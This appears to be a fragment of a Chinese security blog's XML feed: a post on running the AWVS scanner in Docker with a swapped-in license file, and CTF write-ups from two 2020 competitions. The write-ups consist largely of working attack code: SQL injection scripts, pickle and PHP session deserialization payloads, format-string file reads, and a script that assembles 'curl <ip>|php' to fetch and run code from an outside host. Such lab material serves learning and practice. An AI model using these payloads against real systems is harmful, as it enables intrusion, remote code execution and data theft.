<br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 杂 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker部署awvs</title>
      <link href="2020/03/18/docker%E9%83%A8%E7%BD%B2awvs/"/>
      <url>2020/03/18/docker%E9%83%A8%E7%BD%B2awvs/</url>
      
        <content type="html"><![CDATA[<h1 id="docker部署awvs"><a href="#docker部署awvs" class="headerlink" title="docker部署awvs"></a>docker部署awvs</h1><p>链接: <a href="https://pan.baidu.com/s/1QqtdmgOOd-CCPgmD1aZMCw" target="_blank" rel="noopener">https://pan.baidu.com/s/1QqtdmgOOd-CCPgmD1aZMCw</a> 提取码: buti </p><p>将百度云下载内容放到awvs文件夹下</p><p>Dockerfile</p><pre><code class="dockerfile">FROM ubuntu:16.04COPY awvs /awvsEXPOSE 3443RUN /awvs/setenv.sh&amp;&amp; echo -e &quot;\nyes\nubuntu\nccreater@163.com\nccr,123456\nccr,123456\n&quot;|/awvs/acunetix_13.0.200217097_x64_.sh &amp;&amp; \cp /awvs/wvsc /home/acunetix/.acunetix/v_200217097/scanner/wvsc &amp;&amp;\cp /awvs/license_info.json  /home/acunetix/.acunetix/data/license/license_info.json &amp;&amp;\echo -e &#39;#!/bin/bash\nsu acunetix &amp;&amp; (nohup bash ~/.acunetix/start.sh &amp;) &amp;&amp; exit&#39;&gt; /etc/rc.local</code></pre><p>setenv.sh</p><pre><code class="shell">#!/bin/bashshared_obj_deps=(libpango-1.0.so.0 libXext.so.6 libpthread.so.0 libXi.so.6 libgobject-2.0.so.0 libgtk-3.so.0 libdl.so.2 libgdk_pixbuf-2.0.so.0 libX11.so.6 libuuid.so.1 librt.so.1 libexpat.so.1 libglib-2.0.so.0 libXdamage.so.1 libatk-1.0.so.0 libm.so.6 libatspi.so.0 libcups.so.2 libgio-2.0.so.0 libXfixes.so.3 libXrender.so.1 libxcb.so.1 libsmime3.so libcairo.so.2 libXcomposite.so.1 libgdk-3.so.0 libpangocairo-1.0.so.0 libgcc_s.so.1 libX11-xcb.so.1 libdbus-1.so.3 libnss3.so libXrandr.so.2 libnspr4.so libXcursor.so.1 libnssutil3.so libXss.so.1 libasound.so.2 libatk-bridge-2.0.so.0 libc.so.6 libXtst.so.6)read -d &#39;&#39; source &lt;&lt;EOFdeb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial universedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb http://mirrors.aliyun.com/ubuntu/ xenial multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-propertiesdeb http://archive.canonical.com/ubuntu xenial partnerdeb-src http://archive.canonical.com/ubuntu xenial partnerdeb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-security universedeb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverseEOFecho &quot;$source&quot; &gt; /etc/apt/sources.list cat /etc/apt/sources.list apt-get update#for i in ${shared_obj_deps[@]}#do#    echo install $i#    apt-get install $i -y#doneapt-get install libxdamage1 libgtk-3-0 libasound2 libnss3 libxss1 bzip2 sudo libv8-dev -yecho &quot;install success&quot;</code></pre><p>将Dockerfile放在awvs同级目录下,打开命令行移动到Dockerfile所在文件夹,<code>docker build -t awvs .</code></p><p>用Dockerfile创建镜像后,用<code>docker run --privileged=true -p 443:3443-it -d awvs &quot;/sbin/init&quot;</code>来创建容器</p><p>接着等待一会就可以运行了,在改一下本机的hosts,美滋滋,记得是用https去访问</p><p><img src="https://i.loli.net/2020/03/18/5nruJk7RmfLYjtw.png" alt="image3135"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://youngrichog.github.io/2019/08/10/Docker-AWVS批量部署/" target="_blank" rel="noopener">https://youngrichog.github.io/2019/08/10/Docker-AWVS%E6%89%B9%E9%87%8F%E9%83%A8%E7%BD%B2/</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/03/18/docker部署awvs/">https://www.ccreater.top/2020/03/18/docker部署awvs/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 杂 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf高校抗疫</title>
      <link href="2020/03/10/xctf%E9%AB%98%E6%A0%A1%E6%8A%97%E7%96%AB/"/>
      <url>2020/03/10/xctf%E9%AB%98%E6%A0%A1%E6%8A%97%E7%96%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="高校战疫"><a href="#高校战疫" class="headerlink" title="高校战疫"></a>高校战疫</h1><p>打完这次比赛,我再次认清了自己是个卑微的递茶小弟…</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easy-trick-gzmtu"><a href="#easy-trick-gzmtu" class="headerlink" title="easy_trick_gzmtu"></a><strong>easy_trick_gzmtu</strong></h3><pre><code>2020\\%27 2002020%27 5002020\%27 500</code></pre><p>可能作为格式化字符串或者过滤<code>\</code> ?,继续测试</p><pre><code>http://121.37.181.246:6333/?time=2020&#39; or 1%23  =&gt;500http://121.37.181.246:6333/?time=2020or&#39;%23 =&gt;无结果,说明不是过滤orhttp://121.37.181.246:6333/?time=2020&#39;%23or=&gt;没有500,说明or不在黑名单中 </code></pre><pre><code>/?time=2020%27%20||1=1%20--+    返回正确结果/?time=2020%27%20or1=1%20--+   and   &amp;&amp;都页面报错/?time=-1%27%20||1=0%20--+   页面的hello world消失，应该存在布尔盲注</code></pre><pre><code>?time=0&#39;||\i\f(\s\l\e\e\p(2),1,1)%23成功执行,说明是过滤\</code></pre><pre><code class="python">import requests,resql=&quot;union select 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata&quot;#sql=&quot;union select 1,GROUP_CONCAT(id,&#39;,&#39;,username,&#39;,&#39;,passwd,&#39;,&#39;,url,&#39;,&#39;),3 FROM admin&quot;#admin,content#admin#id,username,passwd,url#0,admin,20200202goodluck,/eGlhb2xldW5n,tmp=&quot;&quot;for i in sql:    if i.isalpha():        tmp+=&quot;\\&quot;+i        #print(&quot;\\&quot;+i,end=&quot;&quot;)    else:        tmp+=i        #print(i,end=&quot;&quot;)tmp=&quot;http://121.37.181.246:6333/?time=0&#39;+{}%23&quot;.format(tmp)res=requests.get(tmp)result=re.search(r&#39;&lt;div class=&quot;text-c &quot;&gt;(.*)&lt;/div&gt;&#39;,res.text)print(result.group(1))</code></pre><p>拿到后台地址和管理员账号</p><pre><code>http://121.37.181.246:6333/eGlhb2xldW5nadmin,20200202goodluck</code></pre><pre><code>http://121.37.181.246:6333/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.phphttp://121.37.181.246:6333/eGlhb2xldW5n/check.phphttp://121.37.181.246:6333/eGlhb2xldW5n/index.php</code></pre><p>php版本5.5.9,%00截断</p><p>check.php中可以读取文件但是需要本地访问</p><pre><code>Host: 127.0.0.1X-Forwarded-For: 127.0.0.1Client-Ip: 127.0.0.1Referer: http://127.0.0.1/eGlhb2xldW5n/check.php</code></pre><pre><code>没有用eGlhb2xldW5nLnBocA==:xiaoleung.phpeGlhb2xldW5n:xiaoleung注释里给的:eGlhb2xldW5nLnBocA==.php可能是突破的关键,但是里面啥都没有对eGlhb2xldW5nLnBocA==.php进行参数爆破,也没结果</code></pre><p>存在http请求走私</p><pre><code>GET /eGlhb2xldW5n/check.php?url=fuck&amp;submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1Host: 121.37.181.246:6333X-Forwarded-For: 127.0.0.1Client-Ip: 127.0.0.1Cookie: PHPSESSID=9gkhjmmmp6ctmnn2578n3hcth1GET /eGlhb2xldW5n/check.php?url=fuck&amp;submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1Host: localhostX-Forwarded-For: 127.0.0.1Client-Ip: 127.0.0.1Cookie: PHPSESSID=9gkhjmmmp6ctmnn2578n3hcth1</code></pre><p>最后学长跟我说这里本地访问的意思是url中的ip地址要为127.0.0.1……..无语</p><p>GET /eGlhb2xldW5n/check.php?url=file://localhost/var/www/html/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php&amp;submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1</p><pre><code class="php">&lt;?phpclass trick{    public $gf;    public function content_to_file($content){            $passwd = $_GET[&#39;pass&#39;];        if(preg_match(&#39;/^[a-z]+\.passwd$/m&#39;,$passwd))     {         if(strpos($passwd,&quot;20200202&quot;)){            echo file_get_contents(&quot;/&quot;.$content);        }         }         }    public function aiisc_to_chr($number){        if(strlen($number)&gt;2){        $str = &quot;&quot;;         $number = str_split($number,2);         foreach ($number as $num ) {             $str = $str .chr($num);         }         return strtolower($str);        }        return chr($number);    }    public function calc(){        $gf=$this-&gt;gf;        if(!preg_match(&#39;/[a-zA-z0-9]|\&amp;|\^|#|\$|%/&#39;, $gf)){              eval(&#39;$content=&#39;.$gf.&#39;;&#39;);              $content =  $this-&gt;aiisc_to_chr($content);               return $content;        }    }    public function __destruct(){        $this-&gt;content_to_file($this-&gt;calc());    }}unserialize((base64_decode($_GET[&#39;code&#39;])));?&gt;</code></pre><p>我们要逻辑运算符非来绕过<code>preg_match(&#39;/[a-zA-z0-9]|\&amp;|\^|#|\$|%/&#39;, $gf)</code></p><pre><code class="http">GET /eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php?pass=aaa.passwd%0a20200202&amp;code=Tzo1OiJ0cmljayI6MTp7czoyOiJnZiI7czoxMToifiLIz8jJycrIziIiO30%3DD HTTP/1.1</code></pre><h3 id="webtmp"><a href="#webtmp" class="headerlink" title="webtmp"></a>webtmp</h3><pre><code class="python">import base64import ioimport sysimport picklefrom flask import Flask, Response, render_template, requestimport secretapp = Flask(__name__)class Animal:    def __init__(self, name, category):        self.name = name        self.category = category    def __repr__(self):        return f&#39;Animal(name={self.name!r}, category={self.category!r})&#39;    def __eq__(self, other):        return type(other) is Animal and self.name == other.name and self.category == other.categoryclass RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module == &#39;__main__&#39;:            return getattr(sys.modules[&#39;__main__&#39;], name)        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))def restricted_loads(s):    return RestrictedUnpickler(io.BytesIO(s)).load()def read(filename, encoding=&#39;utf-8&#39;):    with open(filename, &#39;r&#39;, encoding=encoding) as fin:        return fin.read()@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])def index():    if request.args.get(&#39;source&#39;):        return Response(read(__file__), mimetype=&#39;text/plain&#39;)    if request.method == &#39;POST&#39;:        try:            pickle_data = request.form.get(&#39;data&#39;)            if b&#39;R&#39; in base64.b64decode(pickle_data):                return &#39;No... I don\&#39;t like R-things. No Rabits, Rats, Roosters or RCEs.&#39;            else:                result = restricted_loads(base64.b64decode(pickle_data))                if type(result) is not Animal:                    return &#39;Are you sure that is an animal???&#39;            correct = (result == Animal(secret.name, secret.category))            return render_template(&#39;unpickle_result.html&#39;, result=result, pickle_data=pickle_data, giveflag=correct)        except Exception as e:            print(repr(e))            return &quot;Something wrong&quot;    sample_obj = Animal(&#39;一给我哩giaogiao&#39;, &#39;Giao&#39;)    pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode()    return render_template(&#39;unpickle_page.html&#39;, sample_obj=sample_obj, pickle_data=pickle_data)if __name__ == &#39;__main__&#39;:    app.run(host=&#39;0.0.0.0&#39;, port=5000)</code></pre><p>我们可以控制反序列化的内容</p><p>但是反序列化还有限制:</p><pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module == &#39;__main__&#39;:            return getattr(sys.modules[&#39;__main__&#39;], name)        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))def restricted_loads(s):    return RestrictedUnpickler(io.BytesIO(s)).load()</code></pre><p>只能再<code>__main__</code>中寻找属性,这样我们也就无法直接读取secret里的内容了</p><p>关键:</p><p><code>return render_template(&#39;unpickle_result.html&#39;, result=result, pickle_data=pickle_data, giveflag=correct)</code></p><p>不知道是<code>correct!=False</code>给flag还是<code>correct==True</code>给flag</p><p>决定correct的是:<code>correct = (result == Animal(secret.name, secret.category))</code></p><p>会调用<code>Animal的__eq__</code>我们可以令<code>__eq__</code>等于其他的函数来绕过,但是没有找到合适的两个参数的函数</p><p>后来发现<code>Animal(secret.name, secret.category)</code>是在反序列化之后执行的,如果我们可以修改secret,那么我们就可以控制结果</p><p>payload:</p><pre><code class="python">import pickleimport base64p=b&#39;&#39;&#39;c__main__secret(S&#39;name&#39;S&#39;test&#39;S&#39;category&#39;S&#39;test&#39;db&#39;&#39;&#39;+pickle.loads(Animal(&quot;test&quot;,&quot;test&quot;))print(base64.b64encode(p))</code></pre><p><code>flag{409ed945-5b77-4ec3-97e1-b395778842ba}</code></p><h3 id="fmkq"><a href="#fmkq" class="headerlink" title="fmkq"></a>fmkq</h3><p>begin 那里搞个 %s% 就行了。</p><p>8080 出东西了</p><pre><code>Welcome to our FMKQ api, you could use the help information belowTo read file:    /read/file=example&amp;vipcode=example    if you are not vip,let vipcode=0,and you can only read /tmp/{file}Other functions only for the vip!!!</code></pre><pre><code>http://121.37.179.47:1101/?begin=%s%&amp;head=\&amp;url=http://127.0.0.1:8080/read/file=/tmp/flag%26vipcode=1</code></pre><p>flag在 /未知目录/flag。至少能扫目录，或者直接 getshell</p><p><img src="https://i.loli.net/2020/03/08/qlPynLj3IOkZu9A.png" alt="image7052"></p><p>在fuzz过程中有一下报错</p><pre><code>Absolute URI not allowed if server is not a proxy.Malformed Request-Line: bad protocolMalformed Request-URI</code></pre><p>去网上查了下可能是cherrypy</p><p>当输入{file}时,其对应的输出为:error,说明可能有ssti或者格式化字符串漏洞</p><p>利用格式化字符串读取vipcode,从而任意文件读取</p><pre><code>{file.__class__.__init__.__globals__}[&#39;lib&#39;, &#39;media&#39;, &#39;opt&#39;, &#39;var&#39;, &#39;usr&#39;, &#39;mnt&#39;, &#39;bin&#39;, &#39;root&#39;, &#39;home&#39;, &#39;tmp&#39;, &#39;boot&#39;, &#39;sys&#39;, &#39;run&#39;, &#39;sbin&#39;, &#39;srv&#39;, &#39;lib64&#39;, &#39;etc&#39;, &#39;dev&#39;, &#39;proc&#39;, &#39;app&#39;, &#39;.dockerenv&#39;, &#39;fl4g_1s_h3re_u_wi11_rua&#39;]{&#39;truevipcode&#39;: &#39;3Ad8fya45bYeUOFDkJuXpjV1tGHLxzonrCWlER2mPKS9i67w&#39;}&#39;__file__&#39;: &#39;/app/base/readfile.py&#39;</code></pre><pre><code>/?head=\&amp;url=http://127.0.0.1:8080/read/file=/etc/passwd%26vipcode=3Ad8fya45bYeUOFDkJuXpjV1tGHLxzonrCWlER2mPKS9i67w&amp;begin=%s%</code></pre><p>vip.py</p><pre><code class="python">import randomimport stringvipcode = &#39;&#39;class vip:    def __init__(self):        global vipcode        if vipcode == &#39;&#39;:            vipcode = &#39;&#39;.join(random.sample(string.ascii_letters+string.digits, 48))            self.truevipcode = vipcode        else:            self.truevipcode = vipcode    def GetCode(self):        return self.truevipcode</code></pre><p>readfile.py</p><pre><code class="python">from .vip import vipimport reimport osclass File:    def __init__(self,file):        self.file = file    def __str__(self):        return self.file    def GetName(self):        return self.fileclass readfile():    def __str__(self):        filename = self.GetFileName()        if &#39;..&#39; in filename or &#39;proc&#39; in filename:            return &quot;quanbumuda&quot;        else:            try:                file = open(&quot;/tmp/&quot; + filename, &#39;r&#39;)                content = file.read()                file.close()                return content            except:                return &quot;error&quot;    def __init__(self, data):        if re.match(r&#39;file=.*?&amp;vipcode=.*?&#39;,data) != None:            data = data.split(&#39;&amp;&#39;)            data = {                data[0].split(&#39;=&#39;)[0]: data[0].split(&#39;=&#39;)[1],                data[1].split(&#39;=&#39;)[0]: data[1].split(&#39;=&#39;)[1]            }            if &#39;file&#39; in data.keys():                self.file = File(data[&#39;file&#39;])            if &#39;vipcode&#39; in data.keys():                self.vipcode = data[&#39;vipcode&#39;]            self.vip = vip()    def test(self):        if &#39;file&#39; not in dir(self) or &#39;vipcode&#39; not in dir(self) or &#39;vip&#39; not in dir(self):            return False        else:            return True    def isvip(self):        if self.vipcode == self.vip.GetCode():            return True        else:            return False    def GetFileName(self):        return self.file.GetName()current_folder_file = []class vipreadfile():    def __init__(self,readfile):        self.filename = readfile.GetFileName()        self.path = os.path.dirname(os.path.abspath(self.filename))        self.file = File(os.path.basename(os.path.abspath(self.filename)))        global current_folder_file        try:            current_folder_file = os.listdir(self.path)        except:            current_folder_file = current_folder_file    def __str__(self):        if &#39;fl4g&#39; in self.path:            return &#39;nonono,this folder is a secret!!!&#39;        else:            output = &#39;&#39;&#39;Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n&#39;&#39;&#39;            filepath = (self.path + &#39;/{vipfile}&#39;).format(vipfile=self.file)            output += filepath            output += &#39;\r\n\r\nThe content is:\r\n&#39;            try:                f = open(filepath,&#39;r&#39;)                content = f.read()                f.close()            except:                content = &#39;can\&#39;t read&#39;            output += content            output += &#39;\r\n\r\nOther files under the same folder:\r\n&#39;            output += &#39; &#39;.join(current_folder_file)            return output</code></pre><p>app.py</p><pre><code class="python">import webfrom urllib.parse import unquotefrom base.readfile import *urls = (    &#39;/&#39;, &#39;help&#39;,    &#39;/read/(.*)&#39;,&#39;read&#39;)web.config.debug = Falseclass help:    def GET(self):        help_information = &#39;&#39;&#39;        Welcome to our FMKQ api, you could use the help information below        To read file:            /read/file=example&amp;vipcode=example            if you are not vip,let vipcode=0,and you can only read /tmp/{file}        Other functions only for the vip!!!        &#39;&#39;&#39;        return help_informationclass read:    def GET(self,text):        file2read = readfile(text)        if file2read.test() == False:            return &quot;error&quot;        else:            if file2read.isvip() == False:                return (&quot;The content of &quot;+ file2read.GetFileName() +&quot; is {file}&quot;).format(file=file2read)            else:                vipfile2read = vipreadfile(file2read)                return (str(vipfile2read))if __name__ == &quot;__main__&quot;:    app = web.application(urls, globals())    app.run()</code></pre><p>fl4g被过滤了,所以无法直接读flag</p><p>刚开始是想用fd/cwd来读取的,后来fuzz几下服务就炸掉了,所以我们换了个思路</p><p>通过拼接来绕过</p><pre><code>f{vipfile.__class__.__mro__[1].__new__.__doc__[39]}4g_1s_h3re_u_wi11_rua/flag</code></pre><p>flag{qoSF2nKvwoGRI7aJ}</p><h3 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h3><p>session引擎设置错误导致的反序列化</p><p><code>profile.php</code>处的<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code></p><p>其他地方基本都是<code>ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</code></p><p>我们利用sign参数来写入恶意session</p><p>浏览代码发现,这里是我们的目的</p><pre><code class="php">&lt;?phprequire_once(&#39;./init.php&#39;);error_reporting(0);if (check_session($_SESSION)) {    #变成管理员吧，奥利给} else {    die(&#39;只有管理员才能看到我哟&#39;);}function check_session($session){    foreach ($session as $keys =&gt; $values) {        foreach ($values as $key =&gt; $value) {            if ($key === &#39;admin&#39; &amp;&amp; $value === 1) {                return true;            }        }    }    return false;}</code></pre><p>我们最终要构造</p><pre><code class="php">array(    &#39;xxxx&#39;:array(&#39;admin&#39;,1));</code></pre><p>原本我们直接在<code>upload_sign.php</code>中post : <code>sigh[admin]=1</code>即可</p><p>但是<code>upload_sign.php</code>的session引擎是<code>ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</code></p><p>而<code>core/index.php</code>的session引擎是:<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code></p><p>也就是说session是无法被正确解析的</p><blockquote><ul><li>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</li><li>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</li></ul></blockquote><p>根据php和php_serialize两个反序列化引擎的不同之处,我们构造</p><p><code>sign=|a%3A1%3A%7Bs%3A5%3A%22admin%22%3Bi%3A1%3B%7D</code></p><p>拿到</p><pre><code class="php">require_once(&#39;./init.php&#39;);error_reporting(0);if (check_session($_SESSION)) {    #hint : core/clear.php    $sandbox = &#39;./sandbox/&#39; . md5(&quot;Mrk@1xI^&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);    echo $sandbox;    @mkdir($sandbox);    @chdir($sandbox);    if (isset($_POST[&#39;url&#39;])) {        $url = $_POST[&#39;url&#39;];        if (filter_var($url, FILTER_VALIDATE_URL)) {            if (preg_match(&#39;/(data:\/\/)|(&amp;)|(\|)|(\.\/)/i&#39;, $url)) {                echo &quot;you are hacker&quot;;            } else {                $res = parse_url($url);                if (preg_match(&#39;/127\.0\.0\.1$/&#39;, $res[&#39;host&#39;])) {                    $code = file_get_contents($url);                    if (strlen($code) &lt;= 4) {                        @exec($code);                    } else {                        echo &quot;try again&quot;;                    }                }            }        } else {            echo &quot;invalid url&quot;;        }    } else {        highlight_file(__FILE__);    }} else {    die(&#39;只有管理员才能看到我哟&#39;);}</code></pre><p>用<code>compress.zlib://data:@127.0.0.1/plain;base64,xxx</code>来代替data协议</p><pre><code class="python">import random,base64,requestsimport timeshell_ip = &#39;39.108.164.219&#39;# 将shell_IP转换成十六进制ip = &#39;0x&#39; + &#39;&#39;.join([str(hex(int(i))[2:].zfill(2))                     for i in shell_ip.split(&#39;.&#39;)])# payload某些位置的可选字符pos0 = &#39;f&#39;pos1 = &#39;k&#39;pos2 = &#39;g&#39;  # 随意选择字符payload = [    &#39;&gt;dir&#39;,    # 创建名为 dir 的文件    &#39;&gt;%s\\&gt;&#39; % pos0,    # 假设pos0选择 f , 创建名为 f&gt; 的文件    &#39;&gt;%st-&#39; % pos1,    # 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，    # 因为alphabetical序中t&gt;s    &#39;&gt;sl&#39;,    # 创建名为 &gt;sl 的文件；到此处有四个文件，    # ls 的结果会是：dir f&gt; kt- sl    &#39;*&gt;v&#39;,    # 前文提到， * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ，    #  前面提到dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl    # 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符    &#39;&gt;rev&#39;,    # 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v    &#39;*v&gt;%s&#39; % pos2,    # 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。前文也提过了，体会一下。    # 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f    # 续行分割 curl 0x11223344|php 并逆序写入    &#39;&gt;p&#39;,    &#39;&gt;ph\\&#39;,    &#39;&gt;\\|\\&#39;,    &#39;&gt;%s\\&#39; % ip[8:10],    &#39;&gt;%s\\&#39; % ip[6:8],    &#39;&gt;%s\\&#39; % ip[4:6],    &#39;&gt;%s\\&#39; % ip[2:4],    &#39;&gt;%s\\&#39; % ip[0:2],    &#39;&gt;\\ \\&#39;,    &#39;&gt;rl\\&#39;,    &#39;&gt;cu\\&#39;,    &#39;sh &#39; + pos2,    &#39;sh &#39; + pos0,]burp0_url = &quot;http://121.36.222.22:88/core/index.php&quot;burp0_cookies = {&quot;PHPSESSID&quot;: &quot;d0669b0c49bf308022c430b52699b257&quot;, &quot;JSESSIONID&quot;: &quot;E1715942F5CF2C337F1B86D0B6F324E0&quot;}burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Origin&quot;: &quot;http://121.36.222.22:88&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://121.36.222.22:88/core/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}for i in payload:    assert len(i) &lt;= 4    burp0_data = {&quot;url&quot;: &quot;compress.zlib://data:@127.0.0.1/plain;base64,&quot;+str(base64.b64encode(bytes(i,encoding=&quot;ascii&quot;)),encoding=&quot;ascii&quot;)}    r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)    print(r.status_code,burp0_data,i)    print(r.text)    time.sleep(0.1)</code></pre><p><code>flag{B11e_oX4461_Y2h1_100_OIZW4===}</code></p><h3 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h3><p>最简单的题目之一</p><p>payload:<code>&#39;-&#39;0</code></p><h3 id="php-uaf"><a href="#php-uaf" class="headerlink" title="php-uaf"></a>php-uaf</h3><p><a href="https://raw.githubusercontent.com/mm0r1/exploits/master/php7-backtrace-bypass/exploit.php" target="_blank" rel="noopener">https://raw.githubusercontent.com/mm0r1/exploits/master/php7-backtrace-bypass/exploit.php</a><br>直接include就可以了,但是有时候可以,有时候不可以<br><img src="https://i.loli.net/2020/03/08/Cd7RqZwApre2Lxo.png" alt="image16793"></p><p>flag{SObARsac1TyC0V9B}</p><h3 id="webct"><a href="#webct" class="headerlink" title="webct"></a>webct</h3><p><a href="http://www.zip获得源码" target="_blank" rel="noopener">www.zip获得源码</a></p><p>利用mysql load data 来 反序列化</p><pre><code class="php">$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar,phar伪协议不用phar后缀$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$o = new Fileupload(new Listfile(&quot;/;/readflag;&quot;));$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();</code></pre><p><a href="https://github.com/Gifts/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/Gifts/Rogue-MySql-Server</a></p><p>刚开始的时候本地成功打通,但是靶机那里怎么也打不通</p><p>自己弄了个7.3.15的环境后发现</p><p><img src="https://i.loli.net/2020/03/09/9bRVz63Ym7LDNxr.png" alt="image17357"><br>option那里要数字不要字符串<br>MYSQLI_OPT_LOCAL_INFILE对应的数字是8</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/03/10/xctf高校抗疫/">https://www.ccreater.top/2020/03/10/xctf高校抗疫/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋2020</title>
      <link href="2020/02/26/i%E6%98%A5%E7%A7%8B2020/"/>
      <url>2020/02/26/i%E6%98%A5%E7%A7%8B2020/</url>
      
        <content type="html"><![CDATA[<h1 id="i春秋"><a href="#i春秋" class="headerlink" title="i春秋"></a>i春秋</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="简单的招聘系统"><a href="#简单的招聘系统" class="headerlink" title="简单的招聘系统"></a>简单的招聘系统</h3><p>sqlmap直接出来</p><p>flag{2f52809e-f46c-4638-8f72-b24ec1ec6d06}</p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>过滤<code>union,&lt;,&gt;,=</code></p><p>构造<code>http://75087ef5ae2c4685b155e915c62d0060b48ad2be758e45d8.changame.ichunqiu.com/?id=1 and if(hex(substr(fl4g,1,1))-1,sleep(5),0)</code></p><pre><code class="python">import requests&#39;http://75087ef5ae2c4685b155e915c62d0060b48ad2be758e45d8.changame.ichunqiu.com/?id=1%20and%20if(hex(substr(fl4g,POS,1))-GUESS,sleep(5),0)&#39;result=&quot;666c61677b32363837656433302d356266382d343033662d383732342d61643239&quot;l=len(result)while True:    ended=True    l+=1    for i in range(16):        sql=&#39;http://ecd3dce145d342fd9d490cde15ef8239b1e8b5763640437a.changame.ichunqiu.com/?id=0%2bif(conv(substr(hex(fl4g),POS,1),16,10)-GUESS,1,sleep(5))&#39;        sql=sql.replace(&quot;POS&quot;,str(l))        sql=sql.replace(&quot;GUESS&quot;,str(i))        try:            requests.get(sql,timeout=5)            print(sql)        except :            result+=hex(i)[2:]            print(result)            ended=False            break    if ended:        break</code></pre><h3 id="ezsqli"><a href="#ezsqli" 